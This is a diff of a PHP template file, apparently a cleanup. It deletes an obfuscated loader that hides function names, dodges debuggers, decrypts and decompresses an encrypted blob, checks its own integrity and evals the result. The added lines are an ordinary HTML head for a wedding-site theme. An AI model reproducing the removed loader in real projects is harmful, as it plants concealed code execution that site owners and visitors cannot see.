@@ -1,28 +1,35 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_fxzgyoot=('bas'.'e64'.'_de'.'cod'.'e');
-$_h0a11u1p=('gzu'.'nco'.'mpr'.'ess');
-$_nr03vg2m=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_k63iphjk='LJDFLWK7';
-$_w8qj1z73='/gnjuwx2658=';
-$_m99bvj4y='tj+FGgRk';
-$_xcmmjyrc='jQhFPzK+';
-$_b93t7tyc='0G7zXD7h';
-$_ouowk95q='2xqqPw2B';
-$_dwwyvion='p3wpMg==';
-$_f3sg26eb='pW4qALyZ';
-$_kru548jh=$_fxzgyoot($_b93t7tyc.$_m99bvj4y.$_xcmmjyrc.$_k63iphjk.$_w8qj1z73);
-$_xemdks5f=$_fxzgyoot($_f3sg26eb.$_ouowk95q.$_dwwyvion);
-$_lg1vl148=$_fxzgyoot('qurEMQOKaTRA+58m6Sy6S2a6c4IeDgeqK7xA66ApQuI9i/ExRJQhY9UHaJ9XOW61zU/YqGbdqiEhoira9Wni4Hsrqn0PhNIm/2A5TVmTsTJbEx9fidyPq+0PS4Otb8AzljumLGJYwQQ37pqRSX8noQdkgppVM74oT58HTEgwHulk6baho8y6C++nYTc3Q8VOApswcSRLwtr+5QJHqPFrRElL/85wHdrnZL2BTwqI0NZWbJ723LVDZHeqJ80k2SPsgKnUUiJKIuU9D7yMUOxqfT4ZbQSZcr6YMLyn1TdAbmAhEph/CzYKA2zyjZmF7JYjr2MpZEq18QdJEX6/gEcrddSBV3dp2dDqymazLtP5dfAXIXua5Pyv+pLzJr3zgI8FBx7vsqoX6X4YS+XUBV1ZlvTN6djqUhhj9F+WfOlRaebZcNxgI1Wjj8K5ievqjdl4xIRJUQi5t8/lXeqcJNnLsccxCLyLm8wRzGry9QQpSsdc3s0xfiRv9RLtOwSK0e/4xubvJmJUW7jgEw/iU1bkfoAkjHidDnLqPGDbkqADJZ3RX6Zuf2ZSoCvpsjptP9pRi3rXaQxwvy0fEBHs5osrrLY222J71k2UvpDIbU99FgjGFfUJ49NUJ9XMNrZMQvWsU9dlrlOm3ekYqezLywKqied3OYjciPYm2BlhBVyL/sPHHnar1+XixAQDmv2XadyVvKnqMQxTB/acuw9k932/WTJydraryChYfjnr0YR/GM8cQUsM6nLBo7DvtL6sr6O8vmo6gZaeVuQ1Pw/lZpJNWOQg8xtRfY6KBMFmH5Zuce3Cimi6sq38MPPpza7tVT7F78gnj/Qkb+a475rFJjbCKaFA9ajzPQAUGq6G9RTYtW1qZ7suTZhGUdFoT1wR03MJ');
-$_qqiha6vb=$_nr03vg2m($_lg1vl148,'aes-256-cbc',$_kru548jh,OPENSSL_RAW_DATA,$_xemdks5f);
-if($_qqiha6vb===false){exit;}
-$_wd9mp04r=$_h0a11u1p($_qqiha6vb);
-if($_wd9mp04r===false){exit;}
-$_bzsoxerz='a0948e1d8569066d4ac78c0fd509730589d7b04875a270a5b256038aa3fe89aa';
-$_y10pr838=@file_get_contents(__FILE__);
-if($_y10pr838!==false){
-$_tucauk12=str_replace($_bzsoxerz,"0000000000000000000000000000000000000000000000000000000000000000",$_y10pr838);
-$_wtbh34tx=hash("sha256",$_tucauk12);
-if($_wtbh34tx!==$_bzsoxerz){@http_response_code(403);exit;}
+ defined('BASEPATH') OR exit('No direct script access allowed');
+
+$pub_t = (!empty($pub_theme) && !empty($theme)) ? (string) $theme : '';
+$pub_pro = '';
+if ($pub_t !== '' && pro_enabled()) {
+$pub_reg = $this->content_model->registry('themes');
+if (!empty($pub_reg[$pub_t]['pro']) && is_file(FCPATH . 'assets/css/pro/' . $pub_t . '.css')) {
+$pub_pro = 'css/pro/' . $pub_t . '.css';
 }
-eval($_wd9mp04r);
+} ?>
+<!doctype html>
+<html lang="<?= lang_cur() ?>"<?= $pub_t !== '' ? ' data-theme="' . e($pub_t) . '"' : '' ?>>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow">
+<title><?= e(isset($title) ? __($title) : $couple) ?></title>
+<meta name="csrf-name" content="<?= e($this->security->get_csrf_token_name()) ?>">
+<meta name="csrf-hash" content="<?= e($this->security->get_csrf_hash()) ?>">
+<meta name="base-url" content="<?= e(base_url()) ?>">
+<link rel="icon" href="<?= asset_url('img/icon.svg') ?>" type="image/svg+xml">
+<link rel="stylesheet" href="<?= asset_url('fonts/fonts.css') ?>">
+<link rel="stylesheet" href="<?= asset_url('css/app.css') ?>">
+<?php if ($pub_t !== ''): ?>
+<link rel="stylesheet" href="<?= asset_url('css/wedding.css') ?>">
+<link rel="stylesheet" href="<?= asset_url('css/wedding-themes.css') ?>">
+<?php if ($pub_pro !== ''): ?><link rel="stylesheet" href="<?= asset_url($pub_pro) ?>">
+<?php endif; ?>
+<link rel="stylesheet" href="<?= asset_url('css/pub-theme.css') ?>">
+<?php else: ?>
+<style>:root{--accent:<?= e($theme_accent) ?>}</style>
+<?php endif; ?>
+<?= i18n_script() ?>
+</head>
